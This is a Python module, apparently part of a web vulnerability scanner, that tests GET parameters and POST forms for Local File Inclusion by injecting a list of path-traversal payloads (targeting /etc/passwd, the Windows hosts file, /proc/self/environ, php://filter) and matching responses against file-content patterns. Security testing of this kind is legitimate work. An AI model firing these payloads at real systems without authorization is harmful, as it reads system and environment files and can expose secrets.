import re
import urllib.parse


class LFICheck:
    """Local File Inclusion vulnerability checker."""

    LFI_PAYLOADS = [

        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",

        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",

        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",

        "../../../etc/passwd%00",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00",

        "..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",

        "/etc/passwd",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "/proc/version",
        "/proc/self/environ",

        "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
        "file:///etc/passwd",
    ]

    SUCCESS_PATTERNS = [

        re.compile(r"root:.*?:0:0:", re.I),
        re.compile(r"daemon:.*?:/usr/sbin/nologin", re.I),
        re.compile(r"Linux version \d+\.\d+", re.I),
        re.compile(r"PATH=/.*?:/bin", re.I),

        re.compile(r"# Copyright.*Microsoft Corp", re.I),
        re.compile(r"# This is a sample HOSTS file", re.I),
        re.compile(r"\[IPv4\]", re.I),
        re.compile(r"localhost.*127\.0\.0\.1", re.I),

        re.compile(r"python\s+version", re.I),
        re.compile(r"java version", re.I),
    ]

    @classmethod
    def run(cls, http, params_map):
        """Test GET parameters for LFI vulnerabilities."""
        findings = []

        for url, param_names in params_map.items():
            for param in param_names:
                findings.extend(cls._test_parameter(http, url, param))

        return findings

    @classmethod
    def run_forms(cls, http, forms):
        """Test POST forms for LFI vulnerabilities."""
        findings = []

        for form in forms:
            if form["method"].upper() == "POST":
                findings.extend(cls._test_form(http, form))

        return findings

    @classmethod
    def _test_parameter(cls, http, url, param_name):
        """Test a GET parameter for LFI."""
        findings = []

        for payload in cls.LFI_PAYLOADS:
            try:
                parsed = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed.query)

                query_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)

                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                response = http.get(test_url)

                if cls._is_vulnerable(response):
                    findings.append({
                        "type": "Local File Inclusion (GET)",
                        "severity": "HIGH",
                        "severity_score": 8,
                        "url": test_url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": cls._extract_evidence(response.text),
                        "description": f"Local File Inclusion vulnerability found in parameter '{param_name}'. "
                                       f"The application includes files based on user input without proper validation.",
                        "recommendation": "Implement proper input validation, use whitelists for allowed files, "
                                          "and avoid direct file inclusion based on user input."
                    })

                    break


            except Exception:
                continue

        return findings

    @classmethod
    def _test_form(cls, http, form):
        """Test a POST form for LFI."""
        findings = []

        for input_field in form["inputs"]:
            if input_field["hidden"]:
                continue

            param_name = input_field["name"]

            for payload in cls.LFI_PAYLOADS:
                try:
                    data = {}
                    for inp in form["inputs"]:
                        if inp["name"] == param_name:
                            data[inp["name"]] = payload
                        else:
                            data[inp["name"]] = inp["value"]

                    response = http.post(form["action"], data=data)

                    if cls._is_vulnerable(response):
                        findings.append({
                            "type": "Local File Inclusion (POST)",
                            "severity": "HIGH",
                            "severity_score": 8,
                            "url": form["action"],
                            "form_page": form["page"],
                            "param": param_name,
                            "payload": payload,
                            "evidence": cls._extract_evidence(response.text),
                            "description": f"Local File Inclusion vulnerability found in form parameter '{param_name}'. "
                                           f"The application includes files based on user input without proper validation.",
                            "recommendation": "Implement proper input validation, use whitelists for allowed files, "
                                              "and avoid direct file inclusion based on user input."
                        })
                        break

                except Exception:
                    continue

        return findings

    @classmethod
    def _is_vulnerable(cls, response):
        """Check if response indicates LFI vulnerability."""
        if not response or not response.text:
            return False

        for pattern in cls.SUCCESS_PATTERNS:
            if pattern.search(response.text):
                return True

        return False

    @classmethod
    def _extract_evidence(cls, response_text):
        """Extract evidence from response."""
        if not response_text:
            return "File content not retrieved"

        for pattern in cls.SUCCESS_PATTERNS:
            match = pattern.search(response_text)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response_text), match.end() + 100)
                return response_text[start:end].strip()[:300]

        lines = response_text.split('\n')
        for line in lines:
            if any(word in line.lower() for word in ["root", "bin", "sys", "etc", "home", "proc"]):
                return line.strip()[:200]

        return "Potential file content detected in response"
"Potential file content detected in response"